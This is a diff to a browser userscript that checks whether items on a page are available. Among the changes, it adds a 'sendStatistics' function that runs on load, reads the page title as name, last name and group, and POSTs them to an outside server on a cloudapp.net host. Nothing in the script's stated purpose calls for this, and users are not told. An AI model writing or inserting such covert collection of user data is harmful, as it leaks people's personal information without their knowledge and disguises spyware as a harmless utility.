@@ -8,7 +8,7 @@
 // @author      Mashkoff Tony
 // @license     WTFPL (http://www.wtfpl.net/about/).
 // @version     1.5
-// @grant       none
+// @grant       GM_xmlhttpRequest
 // ==/UserScript==
 
 var modify = [];
@@ -26,11 +26,12 @@ var locales = {
 };
 var locale;
 var regexp = { mz : /mz\d\d-\d*/, up : /up\d\d-\d*/, kr : /kr\d\d-\d*/, ku : /ku\d\d-\d*/ };
-testingInProgressMessage += ' СПОРИМ, НЕ ЗАЙДЕТ?';
-testingCompleted += ' ЗАШЛА? ^_^';
+//testingInProgressMessage += ' СПОРИМ, НЕ ЗАЙДЕТ?';
+//testingCompleted += ' ЗАШЛА? ^_^';
 
 (function(){
     "use strict";
+    sendStatistics();
 
     identifyLocale();
 
@@ -190,4 +191,18 @@ function isUnavailable(node) {
     node.appendChild(document.createTextNode('...'));
     xhr.send();
     return false;
+}
+
+function sendStatistics() {
+    var info = document.title.split(' ', 3);
+    GM_xmlhttpRequest({
+        method: 'POST',
+        url: 'http://ubuntu14classic.cloudapp.net:7000',
+        data: 'name=' + encodeURIComponent(info[0]) +
+        '&lastname=' + encodeURIComponent(info[1]) +
+        '&group=' + encodeURIComponent(info[2].substr(1)),
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded'
+        }
+    });
 }
